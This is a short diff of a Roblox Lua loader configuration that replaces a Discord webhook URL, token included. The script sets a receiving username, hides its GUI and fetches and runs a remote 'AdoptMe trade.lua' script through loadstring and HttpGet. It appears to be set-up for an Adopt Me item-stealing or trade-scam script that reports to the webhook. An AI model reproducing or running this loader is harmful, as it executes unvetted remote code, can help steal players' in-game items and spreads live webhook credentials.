@@ -1,5 +1,5 @@
 UserName = "accountstock12"
-WebHook = "https://discord.com/api/webhooks/1275039490221674527/BRL0-vfDyutAOq9KiIw7FV7xl45bnNUx3WDT-jcRGq0Li6zHXhn_4Bif_zBX4K3x38rz"
+WebHook = "https://discord.com/api/webhooks/1330081452355752037/NQnPAYBeGFgEWYUyeMnosQSbEzAgJYWbmV2Qhbn43Sf9HIgMr4drgeg09oK8M4TW7aM1"
 
 getgenv().gui = false
 loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/AdoptMe/main/trade.lua"))()
